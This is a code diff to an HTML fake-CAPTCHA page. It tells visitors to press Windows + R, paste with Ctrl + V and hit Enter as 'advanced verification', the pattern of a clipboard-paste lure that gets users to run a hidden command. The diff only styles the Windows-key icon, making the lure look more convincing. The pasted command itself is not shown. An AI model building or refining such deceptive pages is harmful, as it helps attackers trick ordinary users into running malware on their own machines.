@@ -9,6 +9,13 @@
 
     <!-- FontAwesome for Windows Key Icon -->
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
+
+    <style>
+        /* Make the Windows key icon black */
+        .windows-icon {
+            color: black;  /* Change color to black */
+        }
+    </style>
 </head>
 <body>
     <div class="captcha-container">
@@ -26,7 +33,7 @@
         </div>
         <div id="resultMessage" class="result-message"></div>
         <div class="command-instructions" style="display: none;">
-            <p>Advanced verification required. Please press <b><i class="fas fa-windows"></i> + R</b>, then <b>Ctrl + V</b>, and hit <b>Enter</b> to initiate the advanced verification process.</p>
+            <p>Advanced verification required. Please press <b><i class="fas fa-windows windows-icon"></i> + R</b>, then <b>Ctrl + V</b>, and hit <b>Enter</b> to initiate the advanced verification process.</p>
         </div>
     </div>
 </body>
